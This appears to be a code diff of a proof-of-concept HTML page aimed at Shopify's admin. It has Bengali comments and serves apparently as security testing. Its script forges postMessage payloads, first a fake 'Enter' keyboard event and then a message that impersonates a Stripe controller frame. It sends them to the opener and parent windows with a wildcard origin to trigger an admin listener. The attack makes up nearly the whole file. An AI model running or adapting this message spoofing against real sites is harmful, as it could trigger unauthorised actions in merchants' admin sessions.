@@ -1,27 +1,20 @@
 <!DOCTYPE html>
+<!DOCTYPE html>
 <html>
-<head>
-    <title>Shopify Security Test</title>
-</head>
 <body>
-    <h1>Security Vector Testing</h1>
     <script>
-        // শপিফাইয়ের সেই লিসেনার ট্রিগার করার জন্য ফাইনাল পেলোড
-        const payload = {
-            type: "keyboard",
-            payload: { 
-                keys: ["Enter"], 
-                held: [] 
-            },
-            signature: "test" 
+        // স্ট্রাইপের মেসেজ ফরম্যাটের সাথে মিলিয়ে পেলোড তৈরি
+        const fakeStripePayload = {
+            type: "parent", 
+            sourceFrameId: "__privateStripeController5791", // আপনার কনসোল থেকে পাওয়া আইডি
+            __stripeJsV3: true
         };
 
-        // শপিফাই অ্যাডমিনের সাথে যোগাযোগ স্থাপন
-        // শপিফাইয়ের যদি কোনো মোডাল খোলা থাকে, তবে এটি মেসেজ পাঠাবে
-        window.opener?.postMessage(payload, "*");
-        window.parent?.postMessage(payload, "*");
+        // শপিফাই অ্যাডমিনের লিসেনারকে মেসেজ পাঠানো
+        window.opener?.postMessage(fakeStripePayload, "*");
+        window.parent?.postMessage(fakeStripePayload, "*");
         
-        console.log("Payload has been dispatched!");
+        console.log("✅ Fake Stripe payload dispatched!");
     </script>
 </body>
 </html>
